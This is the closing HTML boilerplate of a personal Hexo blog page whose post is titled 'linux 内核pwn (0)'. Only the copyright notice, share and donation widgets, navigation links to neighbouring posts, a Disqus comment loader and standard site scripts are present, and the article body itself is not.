</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Paxos</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/07/12/linux-%E5%86%85%E6%A0%B8pwn-0/">http://yoursite.com/2020/07/12/linux-%E5%86%85%E6%A0%B8pwn-0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s1.ax1x.com/2020/08/14/di8hDO.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> Donate<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"/><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/07/16/Linux%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/"><img class="prev_cover" src="https://s1.ax1x.com/2020/07/16/UDSEZ9.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Linux内核基础学习笔记</div></div></a></div><div class="next-post pull_right"><a href="/2020/06/26/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5%E6%95%B4%E7%90%86%E4%B8%8E%E5%A4%8D%E4%B9%A0/"><img class="next_cover" src="https://s1.ax1x.com/2020/06/26/NDRFPJ.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">操作系统相关概念整理与复习</div></div></a></div></nav><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> Comment</span></div><div id="disqus_thread"></div><script>var disqus_config = function () {
  this.page.url = 'http://yoursite.com/2020/07/12/linux-%E5%86%85%E6%A0%B8pwn-0/';
  this.page.identifier = '2020/07/12/linux-内核pwn-0/';
  this.page.title = 'linux 内核pwn (0)';
};
(function() { 
  var d = document, s = d.createElement('script');
  s.src = 'https://ScUpax0s.disqus.com/embed.js';
  s.setAttribute('data-timestamp', +new Date());
  (d.head || d.body).appendChild(s);
})();
</script><script>function getDisqusCount() {
  var d = document, s = d.createElement('script');
  s.src = 'https://ScUpax0s.disqus.com/count.js';
  s.id = 'dsq-count-scr';
  (d.head || d.body).appendChild(s);
}

window.addEventListener('load', getDisqusCount, false);</script></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By Paxos</div><div class="framework-info"><span>Driven </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="Read Mode"></i><i class="fa fa-plus" id="font_plus" title="Increase font size"></i><i class="fa fa-minus" id="font_minus" title="Decrease font size"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="Traditional Chinese and Simplified Chinese Conversion" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="Dark Mode"></i></div><div id="rightside-config-show"><div id="rightside_config" title="Setting"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="Scroll to comment"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="Table of Contents" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="Back to top" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>